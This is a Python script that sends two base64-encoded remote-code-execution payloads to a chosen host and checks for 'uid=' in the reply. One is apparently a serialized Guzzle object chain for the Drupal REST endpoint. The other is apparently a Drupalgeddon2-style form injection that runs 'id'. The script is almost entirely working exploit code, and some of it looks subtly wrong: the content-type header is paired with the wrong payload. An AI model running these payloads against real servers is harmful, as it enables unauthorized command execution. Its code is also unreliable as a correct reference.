import re
import requests
import sys
import os
import base64

def exploit(dst_addr):
	list = [["/node/1?_format=hal_json","ewogICJsaW5rIjogWwogICAgewogICAgICAidmFsdWUiOiAibGluayIsCiAgICAgICJvcHRpb25zIjogIk86MjQ6XCJHdXp6bGVIdHRwXFxQc3I3XFxGblN0cmVhbVwiOjI6e3M6MzM6XCJcdTAwMDBHdXp6bGVIdHRwXFxQc3I3XFxGblN0cmVhbVx1MDAwMG1ldGhvZHNcIjthOjE6e3M6NTpcImNsb3NlXCI7YToyOntpOjA7TzoyMzpcIkd1enpsZUh0dHBcXEhhbmRsZXJTdGFja1wiOjM6e3M6MzI6XCJcdTAwMDBHdXp6bGVIdHRwXFxIYW5kbGVyU3RhY2tcdTAwMDBoYW5kbGVyXCI7czoyOlwiaWRcIjtzOjMwOlwiXHUwMDAwR3V6emxlSHR0cFxcSGFuZGxlclN0YWNrXHUwMDAwc3RhY2tcIjthOjE6e2k6MDthOjE6e2k6MDtzOjY6XCJzeXN0ZW1cIjt9fXM6MzE6XCJcdTAwMDBHdXp6bGVIdHRwXFxIYW5kbGVyU3RhY2tcdTAwMDBjYWNoZWRcIjtiOjA7fWk6MTtzOjc6XCJyZXNvbHZlXCI7fX1zOjk6XCJfZm5fY2xvc2VcIjthOjI6e2k6MDtyOjQ7aToxO3M6NzpcInJlc29sdmVcIjt9fSIKICAgIH0KICBdLAogICJfbGlua3MiOiB7CiAgICAidHlwZSI6IHsKICAgICAgImhyZWYiOiAiaHR0cDovL2xvY2FsaG9zdC9yZXN0L3R5cGUvc2hvcnRjdXQvZGVmYXVsdCIKICAgIH0KICB9Cn0KCg=="],["/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax","Zm9ybV9pZD11c2VyX3JlZ2lzdGVyX2Zvcm0mX2RydXBhbF9hamF4PTEmbWFpbFsjcG9zdF9yZW5kZXJdW109ZXhlYyZtYWlsWyN0eXBlXT1tYXJrdXAmbWFpbFsjbWFya3VwXT1pZA=="]]
	print(dst_addr)
	for i in range(2) :
		
		URL="http://"+dst_addr+list[i][0]
		print(URL)
		data = base64.b64decode(list[i][1])
		if i==1:
			headers ={"Content-Type": "application/hal+json"}
			res = requests.post(URL, data=data ,headers=headers, verify=False)
		else :
			res = requests.post(URL, data=data, verify=False)
			
		response = res.text

		p = re.compile('uid=\d')
		m = p.match(response)
		print("Status Code : %d"% res.status_code)
		if m:
				print("Vuln Found")
		else:
				print("Not Found")


if __name__ == "__main__":
	if len(sys.argv) == 2:
		   sys.argv.append('80')
	elif len(sys.argv) < 3:
			print ('Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0]))
			sys.exit()	
	address =(sys.argv[1], sys.argv[2])
	dst_addr=":".join(address)
	exploit(dst_addr)
